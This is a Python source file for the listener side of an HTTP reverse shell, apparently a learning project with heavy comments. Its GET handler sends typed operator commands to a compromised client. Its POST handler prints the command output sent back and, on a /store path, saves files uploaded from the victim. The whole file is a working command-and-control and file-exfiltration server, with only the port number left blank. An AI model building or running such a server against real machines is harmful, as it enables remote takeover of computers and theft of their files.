import http.server #built in library
import os, cgi #cgi helps recv and store the file locally

HOST_NAME = ""
PORT_NUMBER = 



class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self): #send a GET request
        command = input("<Luscious>")
        self.send_response(200) #retain http 200 status to show we got the request from the client sucessfully
        self.send_header("Content-type", "text/html") #used to indicate type of data to the http client
        self.end_headers()
        self.wfile.write(command.encode()) #equivalent of the send function in the TCP ReV Shel

    def do_POST(self): #used to grab HTTP Post
        if self.path == "/store": #check to see if /store was recieved in the url
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type')) #check to see if data type was multipart/form-data(inidicating a file transfer)
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})#we send the file pointer and more to a field storage class that returns an instance that can be indexed like a dictrionary
                else:
                    print('[-] Unexpected POST Request')
                fs_up = fs['file'] #looks for the key from the client script which in this case was "file", we then use that to look for the actual file
                with open('path/place_holder.txt', 'wb') as o: #create a placeholder file to store the recieved binary
                    print('[+] Writing file..')
                    o.write(fs_up.file.read()) #inside the placeholder file we write the recieved file by reading it and simulatenously writing
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return #exit the script
        self.send_response(200) #retain 200 status to indicate that the request was transmitted/recieved successfully sucessfully
        self.end_headers()
        length = int(self.headers['Content-length']) #specifies the amount of bytes of data (numeric)
        postVar = self.rfile.read(length) #tells you to read the length of the POST request
        print(postVar.decode()) #print the read data

if __name__ == "__main__":
    server_class = http.server.HTTPServer #create server class object and the pass host, port and Ip handler
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler) #handler defines what we should do when recieve get or post request
    try:
        print("[+] Now Listening")
        httpd.serve_forever() #start listening forever
    except KeyboardInterrupt:
        print("[-] Server Terminated")
        httpd.server_close()
